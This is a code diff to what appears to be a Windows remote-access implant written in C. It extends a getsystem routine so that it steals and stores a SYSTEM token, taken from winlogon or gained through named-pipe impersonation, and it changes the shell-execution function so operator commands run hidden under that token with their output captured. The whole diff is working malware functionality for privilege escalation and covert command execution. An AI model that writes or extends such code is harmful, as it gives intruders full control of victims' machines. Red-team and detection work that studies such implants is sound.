@@ -35,6 +35,9 @@ char g_working_hours[32] = {0};
 int g_sleep_sec  = AGENT_SLEEP_SEC;
 int g_jitter_pct = AGENT_JITTER_PCT;
 
+// ── SYSTEM primary token (stored by getsystem, used by run_shell) ────────────
+static HANDLE g_system_token = NULL;
+
 // ── Screenwatch globals ────────────────────────────────────────────────────────
 static volatile int g_sw_stop = 1;
 static long long    g_sw_task_id = 0;
@@ -74,17 +77,64 @@ void sleep_until_work_hours(void) {
 // ── Shell execution ───────────────────────────────────────────────────────────
 
 static char* run_shell(const char *cmd) {
-    // Use _popen to capture stdout+stderr
     char full_cmd[4096];
     snprintf(full_cmd, sizeof(full_cmd), "cmd.exe /s /c \"%s\" 2>&1", cmd);
 
+    HANDLE hSysTok = (HANDLE)InterlockedCompareExchangePointer(
+        (PVOID*)&g_system_token, NULL, NULL);
+    if (hSysTok) {
+        HANDLE hRead = NULL, hWrite = NULL;
+        SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
+        if (!CreatePipe(&hRead, &hWrite, &sa, 0))
+            return strdup("[error: CreatePipe]");
+        SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);
+        STARTUPINFOW si = {0};
+        si.cb = sizeof(si);
+        si.dwFlags = STARTF_USESTDHANDLES;
+        si.hStdOutput = hWrite;
+        si.hStdError  = hWrite;
+        si.hStdInput  = INVALID_HANDLE_VALUE;
+        PROCESS_INFORMATION pi = {0};
+        wchar_t wcmd[4096];
+        MultiByteToWideChar(CP_ACP, 0, full_cmd, -1, wcmd, 4096);
+        BOOL ok = CreateProcessWithTokenW(hSysTok, 0, NULL, wcmd,
+            CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+        CloseHandle(hWrite);
+        if (!ok) {
+            DWORD err = GetLastError();
+            CloseHandle(hRead);
+            char *e = (char*)malloc(96);
+            snprintf(e, 96, "[error: CreateProcessWithTokenW %lu]", err);
+            return e;
+        }
+        size_t cap = 4096, len = 0;
+        char *buf = (char*)malloc(cap);
+        if (!buf) {
+            TerminateProcess(pi.hProcess, 1);
+            CloseHandle(hRead); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
+            return strdup("[oom]");
+        }
+        DWORD nr; char tmp[512];
+        while (ReadFile(hRead, tmp, sizeof(tmp), &nr, NULL) && nr > 0) {
+            if (len + nr + 1 >= cap) {
+                cap = (len + nr) * 2 + 1024;
+                char *nb = (char*)realloc(buf, cap);
+                if (!nb) break;
+                buf = nb;
+            }
+            memcpy(buf + len, tmp, nr); len += nr;
+        }
+        buf[len] = '\0';
+        WaitForSingleObject(pi.hProcess, 60000);
+        CloseHandle(hRead); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
+        return buf;
+    }
+
     FILE *f = _popen(full_cmd, "r");
     if (!f) return strdup("[error: popen failed]");
-
     size_t cap = 4096, len = 0;
     char *buf = (char*)malloc(cap);
     if (!buf) { _pclose(f); return strdup("[error: oom]"); }
-
     int c;
     while ((c = fgetc(f)) != EOF) {
         if (len + 2 >= cap) {
@@ -955,17 +1005,22 @@ static char *get_system(void) {
                     HANDLE hTok = NULL;
                     if (OpenProcessToken(hProc, TOKEN_DUPLICATE, &hTok)) {
                         CloseHandle(hProc);
+                        HANDLE hPrim = NULL;
+                        DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrim);
                         HANDLE hDup = NULL;
                         if (DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hDup)) {
                             CloseHandle(hTok);
                             if (ImpersonateLoggedOnUser(hDup)) {
                                 CloseHandle(hDup);
+                                HANDLE old = (HANDLE)InterlockedExchangePointer((PVOID*)&g_system_token, hPrim);
+                                if (old) CloseHandle(old);
                                 char *out = (char*)malloc(128);
                                 snprintf(out, 128, "[+] T1 SYSTEM (winlogon PID=%lu)", (unsigned long)sysPid);
                                 return out;
                             }
                             CloseHandle(hDup);
                         } else { CloseHandle(hTok); }
+                        if (hPrim) CloseHandle(hPrim);
                     } else { CloseHandle(hProc); }
                 }
             }
@@ -1038,6 +1093,15 @@ static char *get_system(void) {
         char *e = (char*)malloc(96);
         snprintf(e, 96, "[-] T1+T2 failed (ImpersonateNamedPipeClient err %lu)", GetLastError());
         return e;
+    }
+    {
+        HANDLE hThr = NULL, hPrim = NULL;
+        if (OpenThreadToken(GetCurrentThread(), TOKEN_DUPLICATE | TOKEN_ALL_ACCESS, FALSE, &hThr)) {
+            DuplicateTokenEx(hThr, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrim);
+            CloseHandle(hThr);
+        }
+        HANDLE old = (HANDLE)InterlockedExchangePointer((PVOID*)&g_system_token, hPrim);
+        if (old) CloseHandle(old);
     }
     return strdup("[+] T2 SYSTEM (named pipe + service)");
 }
